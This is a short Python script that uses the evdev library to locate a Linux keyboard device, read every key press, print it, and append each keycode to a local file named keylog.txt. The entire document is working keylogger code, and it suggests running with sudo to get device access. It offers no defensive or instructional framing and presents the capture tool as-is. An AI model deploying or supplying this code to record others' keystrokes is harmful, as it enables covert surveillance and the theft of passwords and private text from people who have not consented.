import os
from evdev import InputDevice, list_devices, categorize, ecodes

def find_keyboard():
    """Automatically finds the correct keyboard event device."""
    for device_path in list_devices():
        device = InputDevice(device_path)
        if "keyboard" in device.name.lower() or "kbd" in device.name.lower():
            print(f" Keyboard detected: {device.name} ({device_path})")
            return device_path
    return None

# Find the correct keyboard event
device_path = find_keyboard()

if device_path:
    try:
        device = InputDevice(device_path)
        print(f" Listening for keystrokes on {device_path}...")

        for event in device.read_loop():
            if event.type == ecodes.EV_KEY:
                key_event = categorize(event)
                if key_event.keystate == 1:  # 1 means key is pressed
                    print(f" Key pressed: {key_event.keycode}")
                    with open("keylog.txt", "a") as file:
                        file.write(f"{key_event.keycode}\n")
    except Exception as e:
        print(f" Error: {e}")
else:
    print(" No keyboard device found. Try running with sudo.")

